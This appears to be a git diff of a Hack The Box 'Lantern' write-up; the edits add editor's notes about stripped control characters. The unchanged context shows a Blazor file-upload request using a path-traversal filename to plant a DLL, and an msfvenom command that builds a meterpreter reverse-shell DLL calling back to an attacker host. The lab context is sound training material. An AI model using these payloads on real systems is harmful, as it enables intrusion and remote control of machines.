@@ -139,6 +139,8 @@ I try some XSS and other upload bypasses, notably a null byte let me upload a no
 
 An innocuous login portal was found on port 3000. I intercepted some traffic and found something I am unfamiliar with:
 
+*Editor's Note: markdown does not like rendering control characters they were removed but you will see them within the first portion before the JSON.*
+
 ```
 POST /_blazor?id=WvSYCIIItAsRKhG4fyAgZg HTTP/1.1
 Host: lantern.htb:3000
@@ -155,7 +157,7 @@ Content-Length: 975
 DNT: 1
 Connection: close
 
-Í¡0¬StartCircuit¸http://lantern.htb:3000/½http://lantern.htb:3000/loginÚ[{"type":"server","sequence":0,"descriptor":"CfDJ8BUo1ePf0MxMocV2v0oTDZEUquJNkyDRzxlJfPonBJI/SMm+P11uHleduR+cYu9NBIS6vLBuNL7M1brYjZm0Lex87L4HfTZLAXWqdn/ngBCFrD6OKnsjkFhEAZRuIQe3rfKT2cDbVUcvDbVm1iDfZ6SZV4qEmb/EOoLTkJCJz2eOtFfoMrJWGdmSxzxXG3VToUJfCwyYDKeWXouBRnaIkHxCCbr5ZOKJBbf8Nn3s+nHYXnRR+8DPILXm8Rj+oyo2YfKdGSh5VhYQmmvyg+aJpHxCeLhB3Jq57qb4JarvRGNX6WVcI/CRBuLBJqUHtKfzYRMxnLUYQ489K8JNWy+u+i/j4CAPWIqNWQWCJszj7IkI"},{"type":"server","sequence":1,"descriptor":"CfDJ8BUo1ePf0MxMocV2v0oTDZHIFYnGWlxHVWZEdbwDAo7VQu6T2/VBw5u0sjWBqIq/qdlU0W0Q00jp3w1bM9iPyfectRGSSfbr/nbHJKBvLBLydI1+HuNa6i7fOmOSaCPiUOa+7ulpdmdGxn8lEju5tOxcIVt5Or7C5LsqFg029vBK822Qe2TAAIiPDWHQRYJBfq+XRgiTcFb2MLSZxJIqrxRnJV1eFmQFY6EkksMpp1IfUm52pEwfnA/7wn1PwrBXLaC9AjdqOfHQkYMKPT+XXzz9AqsbLrRPOO+IIKGM4k9TqbjhRMRiFo5OZX45wcToZ7Pzh7b8aZq1UIReLbo8T5me90w7HYgaHhQVNRzouHC7qcw4NqYDS9Ly9wjZR96Lptn0XzZ9L8x+Ehjx8ob9u+oevhoIrgv4N3FWPnEn2Mux"}] 
+Í¡0¬StartCircuit¸http://lantern.htb:3000/½http://lantern.htb:3000/loginÚ[{"type":"server","sequence":0,"descriptor":"CfDJ8BUo1ePf0MxMocV2v0oTDZEUquJNkyDRzxlJfPonBJI/SMm+P11uHleduR+cYu9NBIS6vLBuNL7M1brYjZm0Lex87L4HfTZLAXWqdn/ngBCFrD6OKnsjkFhEAZRuIQe3rfKT2cDbVUcvDbVm1iDfZ6SZV4qEmb/EOoLTkJCJz2eOtFfoMrJWGdmSxzxXG3VToUJfCwyYDKeWXouBRnaIkHxCCbr5ZOKJBbf8Nn3s+nHYXnRR+8DPILXm8Rj+oyo2YfKdGSh5VhYQmmvyg+aJpHxCeLhB3Jq57qb4JarvRGNX6WVcI/CRBuLBJqUHtKfzYRMxnLUYQ489K8JNWy+u+i/j4CAPWIqNWQWCJszj7IkI"},{"type":"server","sequence":1,"descriptor":"CfDJ8BUo1ePf0MxMocV2v0oTDZHIFYnGWlxHVWZEdbwDAo7VQu6T2/VBw5u0sjWBqIq/qdlU0W0Q00jp3w1bM9iPyfectRGSSfbr/nbHJKBvLBLydI1+HuNa6i7fOmOSaCPiUOa+7ulpdmdGxn8lEju5tOxcIVt5Or7C5LsqFg029vBK822Qe2TAAIiPDWHQRYJBfq+XRgiTcFb2MLSZxJIqrxRnJV1eFmQFY6EkksMpp1IfUm52pEwfnA/7wn1PwrBXLaC9AjdqOfHQkYMKPT+XXzz9AqsbLrRPOO+IIKGM4k9TqbjhRMRiFo5OZX45wcToZ7Pzh7b8aZq1UIReLbo8T5me90w7HYgaHhQVNRzouHC7qcw4NqYDS9Ly9wjZR96Lptn0XzZ9L8x+Ehjx8ob9u+oevhoIrgv4N3FWPnEn2Mux"}] 
 ```
 
 By the looks of the directory we are POSTing to, this is a .net blazor application. I dig around for some way to convert or change the data being sent and received, and I found [this blazor traffic processor burp extension](https://www.aon.com/cyber-solutions/aon_cyber_labs/new_burp_suite_extension_blazortrafficprocessor/). Each section of the json defines its length, so changing individual values is a futile effort. The extension allows the changing to json, the modifying of that json, then the reconverting back to the serialized data. 
@@ -536,6 +538,8 @@ I first try to make a shell with msfvenom.
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=7777 -f dll > racc_shell.dll
 ```
 
+*Editor's Note: same thing as the previous note some control characters and special characters were removed from the response but you will see them if you do this yourself.*
+
 ```
 POST /_blazor?id=XGXAr_D4CqyM1O-9vy4kYw HTTP/1.1
 Host: lantern.htb:3000
@@ -552,7 +556,7 @@ Content-Length: 194
 DNT: 1
 Connection: close
 
-êÀ·BeginInvokeDotNetFromJS¡2À¬NotifyChangeÙº[[{"blob":{},"size":9216,"name":"../../../../../../../../../opt/components/racc_shell.dll","id":1,"lastModified":"2024-08-24T04:24:12.616Z","contentType":"application/x-msdos-program"}]]
+êÀ·BeginInvokeDotNetFromJS¡2À¬NotifyChangeÙº[[{"blob":{},"size":9216,"name":"../../../../../../../../../opt/components/racc_shell.dll","id":1,"lastModified":"2024-08-24T04:24:12.616Z","contentType":"application/x-msdos-program"}]]
 ```
 
 Same error as an empty file: bad IL format. I try another way at making my own dll from scratch before deciding it's better to shell out *FileUpload.dll*. I then need try to read tomas' key. Some of this was added with the assistance of Senior Dev GPT, and namely the builder and render parts got very upset in my testing if I ever modified or changed them. 
@@ -700,6 +704,8 @@ The arguments column is spitting out inconsistent and odd results. Looking back 
 
 I need to determine what kind of data can be found in arguments so here I will be encoding to hex then decoding and removing null bytes in CyberChef.
 
+*Editor's Note: more control code was removed below decode yourself to see it.*
+
 ```sql
 sqlite> select hex(arguments) from ebpf order by timestamp limit 1;
 01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
@@ -707,10 +713,12 @@ sqlite> select * from ebpf order by timestamp limit 1;
 18076|140123590453383$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|100000428822012|write|16722|
 
 CYBERCHEF:
-[?25l(Becho4C(B Re
+[?25l(Becho4C(B Re
 ```
 
 There is an ANSI escape code in the arguments for this entry, useful for outputting to terminals. The result code of this entry is 6, much greater than 1. It is possible the resultcode positive integers correspond to how many bytes were output. On that same vein the first 9 bytes are always the same and I can start the substr() from 9 instead of 0. 
+
+*Editor's Note: more control code was removed below decode yourself to see it.*
 
 ```sql
 sqlite> select hex(substr(arguments,9)) from ebpf where resultcode > 0 order by timestamp limit 3;
@@ -723,10 +731,10 @@ sqlite> select * from ebpf where resultcode > 0 order by timestamp limit 3;
 18076|140123590453383$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|1|100000432733829|write|8847|
 
 CYBERCHEF:
-[?25l(Becho4C(B Re[?25h(Becho4C(B Reh[?25h(Becho4C(B Re0+/l÷U
+[?25l(Becho4C(B Re[?25h(Becho4C(B Reh[?25h(Becho4C(B Re0+/l÷U
 ```
 
-If I assume the resultcode is the bytes written, that means a resultcode of 6 on these queries corresponds to `[?25l` and 1 corresponds to `h`. I then filter the above hex from cyberchef then cat the download.dat output it spits out an *h* as expected. 
+If I assume the resultcode is the bytes written, that means a resultcode of 6 on these queries corresponds to `[?25l` and 1 corresponds to `h`. I then filter the above hex from cyberchef then cat the download.dat output it spits out an *h* as expected. 
 
 
 
